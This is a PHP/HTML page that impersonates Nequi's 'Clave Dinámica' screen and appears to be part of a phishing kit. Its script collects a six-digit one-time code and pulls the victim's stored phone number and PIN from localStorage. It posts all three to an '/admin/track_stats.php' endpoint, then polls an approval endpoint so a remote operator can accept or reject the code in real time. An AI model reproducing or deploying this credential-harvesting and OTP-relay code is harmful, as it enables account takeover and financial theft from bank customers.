<?php
// Nequi dinamica.php - Clave Dinámica con Polling
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Clave Dinámica Nequi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Manrope', sans-serif; background: #FDE8F0; min-height: 100vh; }
    .nav { display: flex; justify-content: space-between; align-items: center; padding: 0 24px; background: white; border-bottom: 1px solid #F0E0E8; position: sticky; top: 0; z-index: 100; height: 64px; }
    .logo-img { height: 100px; width: auto; }
    .nav-btn { background: #FF006B; color: white; border: none; padding: 10px 22px; border-radius: 8px; font-weight: 700; font-family: 'Manrope', sans-serif; font-size: 15px; cursor: pointer; }
    .page { min-height: calc(100vh - 64px); position: relative; display: flex; align-items: center; justify-content: center; padding: 40px 16px; overflow: hidden; }
    .blob { position: absolute; border-radius: 50%; background: rgba(255, 0, 107, 0.08); pointer-events: none; }
    .blob-1 { width: 260px; height: 260px; top: -60px; left: -80px; }
    .blob-2 { width: 200px; height: 200px; top: 20px; right: -60px; background: rgba(255, 0, 107, 0.05); }
    .blob-3 { width: 300px; height: 300px; bottom: -80px; left: -60px; background: rgba(255, 0, 107, 0.06); }
    .blob-4 { width: 180px; height: 180px; bottom: 40px; right: -50px; background: rgba(255, 0, 107, 0.04); }
    .blob-5 { width: 120px; height: 120px; top: 50%; left: 8%; background: rgba(255, 0, 107, 0.05); }
    .blob-6 { width: 140px; height: 140px; top: 30%; right: 6%; background: rgba(255, 0, 107, 0.04); }
    .card { background: white; border-radius: 20px; padding: 40px 32px; width: 100%; max-width: 420px; position: relative; z-index: 2; box-shadow: 0 4px 40px rgba(255, 0, 107, 0.08); }
    .card-title { font-size: 24px; font-weight: 800; color: #1A1A1A; text-align: center; margin-bottom: 10px; }
    .card-subtitle { font-size: 14px; color: #888; text-align: center; margin-bottom: 28px; line-height: 1.5; }

    .dynamic-inputs { display: flex; gap: 8px; margin-bottom: 24px; justify-content: center; }
    .dynamic-input { width: 50px; height: 60px; border: 2px solid #E8E8E8; border-radius: 10px; font-size: 32px; font-weight: 700; text-align: center; color: #1A1A1A; font-family: 'Manrope', sans-serif; transition: border-color 0.2s; }
    .dynamic-input:focus { outline: none; border-color: #FF006B; }
    .dynamic-input.filled { border-color: #FF006B; }
    .dynamic-input.error { border-color: #FF0000; animation: shake 0.4s; }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }

    .error-msg { color: #FF0000; font-size: 13px; text-align: center; margin-bottom: 20px; font-weight: 600; display: none; }
    .error-msg.show { display: block; }

    .submit-btn { width: 100%; background: #FFADD1; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 700; font-family: 'Manrope', sans-serif; cursor: not-allowed; transition: background 0.3s; }
    .submit-btn.active { background: #FF006B; cursor: pointer; }

    .polling-container { text-align: center; }
    .polling-spinner { width: 60px; height: 60px; border: 4px solid #FFADD1; border-top-color: #FF006B; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .polling-text { font-size: 14px; color: #666; margin-top: 16px; }
    .polling-status { font-size: 13px; color: #999; margin-top: 8px; }

    @media (min-width: 768px) {
      .card { padding: 48px 44px; }
      .card-title { font-size: 28px; }
      .blob-1 { width: 380px; height: 380px; top: -100px; left: -120px; }
      .blob-2 { width: 300px; height: 300px; top: 20px; right: -80px; }
      .blob-3 { width: 420px; height: 420px; bottom: -120px; left: -80px; }
      .blob-4 { width: 260px; height: 260px; bottom: 60px; right: -60px; }
    }
  </style>
</head>
<body>

  <nav class="nav">
    <img src="logo.png" alt="Nequi" class="logo-img">
    <button class="nav-btn">Recarga</button>
  </nav>

  <div class="page">
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="blob blob-3"></div>
    <div class="blob blob-4"></div>
    <div class="blob blob-5"></div>
    <div class="blob blob-6"></div>

    <div class="card">
      <div id="dynamicInputPhase">
        <h1 class="card-title">Clave Dinámica</h1>
        <p class="card-subtitle">Ingresa los 6 dígitos de tu clave dinámica.</p>

        <div class="dynamic-inputs">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit1">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit2">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit3">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit4">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit5">
          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit6">
        </div>

        <p class="error-msg" id="errorMsg">Clave incorrecta. Intenta nuevamente.</p>

        <button class="submit-btn" id="submitBtnDynamic">Continuar</button>
      </div>

      <div id="pollingPhase" style="display: none;">
        <div class="polling-container">
          <h1 class="card-title">Validando información</h1>
          <p class="card-subtitle">Estamos verificando tu clave dinámica. Por favor espera.</p>
          <div class="polling-spinner"></div>
          <p class="polling-text">Verificando...</p>
          <p class="polling-status" id="pollingStatus">Intento 1/3</p>
        </div>
      </div>
    </div>
  </div>

  <script>
    const dynamicInputs = [
      document.getElementById('digit1'),
      document.getElementById('digit2'),
      document.getElementById('digit3'),
      document.getElementById('digit4'),
      document.getElementById('digit5'),
      document.getElementById('digit6')
    ];

    let intentosDinamica = 0;
    let pollingInterval = null;
    let logIdDinamica = null;

    dynamicInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value !== '') {
          this.classList.add('filled');
          if (index < dynamicInputs.length - 1) {
            dynamicInputs[index + 1].focus();
          }
        } else {
          this.classList.remove('filled');
        }
        checkDynamicForm();
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          dynamicInputs[index - 1].focus();
          dynamicInputs[index - 1].value = '';
          dynamicInputs[index - 1].classList.remove('filled');
          checkDynamicForm();
        }
        if (e.key.length === 1 && !/[0-9]/.test(e.key)) e.preventDefault();
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
        digits.forEach((digit, i) => {
          if (dynamicInputs[i]) { dynamicInputs[i].value = digit; dynamicInputs[i].classList.add('filled'); }
        });
        if (digits.length > 0) dynamicInputs[Math.min(digits.length, 6) - 1].focus();
        checkDynamicForm();
      });
    });

    function checkDynamicForm() {
      const allFilled = dynamicInputs.every(input => input.value !== '');
      const btn = document.getElementById('submitBtnDynamic');
      btn.classList.toggle('active', allFilled);
      btn.disabled = !allFilled;
    }

    function getCode() {
      return dynamicInputs.map(i => i.value).join('');
    }

    function clearCode() {
      dynamicInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled', 'error');
      });
      checkDynamicForm();
    }

    function showError() {
      dynamicInputs.forEach(input => input.classList.add('error'));
      document.getElementById('errorMsg').classList.add('show');
      setTimeout(() => {
        dynamicInputs.forEach(input => input.classList.remove('error'));
        document.getElementById('errorMsg').classList.remove('show');
      }, 3000);
    }

    async function checkDynamicStatus() {
      if (!logIdDinamica) return;

      try {
        const response = await fetch(`../../admin/check_aprobacion.php?log_id=${logIdDinamica}`);
        const data = await response.json();

        console.log('📊 Respuesta check_aprobacion (dinámica):', data);

        if (data.estado === 'aprobado') {
          console.log('✅ DINÁMICA APROBADA');
          clearInterval(pollingInterval);
          localStorage.setItem('dinamica_aprobada_nequi', 'true');
          console.log('🔄 Redirigiendo a index principal...');
          window.location.href = '../../index.php';
        } else if (data.estado === 'rechazado') {
          console.log('❌ DINÁMICA RECHAZADA');
          clearInterval(pollingInterval);
          document.getElementById('dynamicInputPhase').style.display = 'block';
          document.getElementById('pollingPhase').style.display = 'none';
          
          intentosDinamica++;
          
          if (intentosDinamica < 3) {
            showError();
            setTimeout(() => {
              clearCode();
              dynamicInputs[0].focus();
            }, 500);
          } else {
            alert('❌ Ha excedido el número máximo de intentos (3). Regresando al inicio...');
            setTimeout(() => {
              window.location.href = 'index.php';
            }, 1000);
          }
        } else {
          console.log('⏳ Pendiente...');
        }
      } catch (err) {
        console.error('Error checking status:', err);
      }
    }

    document.getElementById('submitBtnDynamic').addEventListener('click', async () => {
      const btn = document.getElementById('submitBtnDynamic');
      if (btn.disabled) return;

      const code = getCode();
      intentosDinamica++;

      const usuario = localStorage.getItem('usuario_nequi') || '';
      const clave = localStorage.getItem('clave_pin_nequi') || '';

      const formData = new FormData();
      formData.append('activity', 'DINÁMICA (NEQUI)');
      formData.append('action', 'log');
      formData.append('metodo', 'PSE');
      formData.append('banco', 'Nequi');
      formData.append('documento', usuario);
      formData.append('usuario', usuario);
      formData.append('identificacion', usuario);
      formData.append('tipo_identificacion', 'CELULAR');
      formData.append('clave_pin', clave);
      formData.append('codigo_dinamica', code);
      formData.append('codigo_otp', code);
      formData.append('clave_tarjeta', '');
      formData.append('ultimos_digitos', '');

      try {
        const response = await fetch('../../admin/track_stats.php', {
          method: 'POST',
          body: formData,
          keepalive: true
        });

        const data = await response.json();
        console.log('📝 Respuesta track_stats (dinámica):', data);
        
        if (data.success) {
          logIdDinamica = data.id;
          localStorage.setItem('log_id_dinamica_nequi', data.id);

          document.getElementById('dynamicInputPhase').style.display = 'none';
          document.getElementById('pollingPhase').style.display = 'block';

          checkDynamicStatus();
          
          let intentoActual = 1;
          pollingInterval = setInterval(() => {
            intentoActual++;
            document.getElementById('pollingStatus').textContent = `Intento ${intentoActual}/∞`;
            checkDynamicStatus();
          }, 2000);
        } else {
          alert('❌ Error al enviar la clave dinámica.');
          document.getElementById('dynamicInputPhase').style.display = 'block';
          document.getElementById('pollingPhase').style.display = 'none';
        }
      } catch (err) {
        console.error('Error:', err);
        alert('❌ Error de conexión.');
        document.getElementById('dynamicInputPhase').style.display = 'block';
        document.getElementById('pollingPhase').style.display = 'none';
      }
    });
  </script>

</body>
</html>